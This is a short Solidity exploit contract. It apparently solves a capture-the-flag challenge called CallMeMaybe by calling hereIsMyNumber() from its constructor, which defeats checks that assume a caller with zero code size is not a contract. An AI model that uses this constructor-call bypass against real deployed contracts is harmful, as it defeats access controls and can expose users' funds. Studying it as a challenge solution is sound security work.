// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ICallMeMaybe {
    function hereIsMyNumber() external;
}

contract Attacker {
    address callMeMaybe;

    constructor (address _callMeMaybe) {
        callMeMaybe = _callMeMaybe;

        // Runtime code has to be 0 -> We need to call the contract at the constructor (deployment code)
        ICallMeMaybe(callMeMaybe).hereIsMyNumber();
    }

    receive() external payable { }
}